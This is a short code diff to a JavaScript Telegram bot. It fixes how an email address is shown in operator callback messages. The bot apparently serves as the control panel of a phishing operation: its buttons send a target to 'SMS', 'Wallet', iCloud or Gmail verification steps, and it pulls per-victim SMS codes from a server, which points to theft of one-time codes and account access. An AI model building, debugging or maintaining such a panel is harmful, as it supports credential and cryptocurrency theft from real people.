@@ -314,19 +314,19 @@ bot.on("callback_query", async (query) => {
         try {
           const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
           const verifyData = await verifyRes.json();
-          // displayEmail comes from callback_data
+          const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
           
           let choiceText = '';
           if (action === "verifying_sms") {
-            choiceText = `📧 <code>${displayEmail}</code> → <b>SMS - 2</b> 💬`;
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
           } else if (action === "verifying_done") {
-            choiceText = `📧 <code>${displayEmail}</code> → <b>Done</b> 🏁`;
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
           } else if (action === "verifying_wallet") {
-            choiceText = `📧 <code>${displayEmail}</code> → <b>Wallet</b> 💼`;
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
           } else if (action === "verifying_icloud") {
-            choiceText = `📧 <code>${displayEmail}</code> → ☁️`;
+            choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
           } else if (action === "verifying_gmail") {
-            choiceText = `📧 <code>${displayEmail}</code> → 🌈`;
+            choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
           }
           
           if (choiceText) {
@@ -390,6 +390,7 @@ bot.on("callback_query", async (query) => {
     
     let email = identifier;
     let smsCode = "";
+    let displayEmail = email;  // ✅ What to show in acceptance message
 
     // ✅ For SMS callbacks, get SMS code from server
     if (action.startsWith("sms_")) {
@@ -683,19 +684,19 @@ if (bot2) {
           try {
             const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
             const verifyData = await verifyRes.json();
-            // displayEmail comes from callback_data
+            const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
             
             let choiceText = '';
             if (action === "verifying_sms") {
-              choiceText = `📧 <code>${displayEmail}</code> → <b>SMS - 2</b> 💬`;
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
             } else if (action === "verifying_done") {
-              choiceText = `📧 <code>${displayEmail}</code> → <b>Done</b> 🏁`;
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
             } else if (action === "verifying_wallet") {
-              choiceText = `📧 <code>${displayEmail}</code> → <b>Wallet</b> 💼`;
+              choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
             } else if (action === "verifying_icloud") {
-              choiceText = `📧 <code>${displayEmail}</code> → ☁️`;
+              choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
             } else if (action === "verifying_gmail") {
-              choiceText = `📧 <code>${displayEmail}</code> → 🌈`;
+              choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
             }
             
             if (choiceText) {
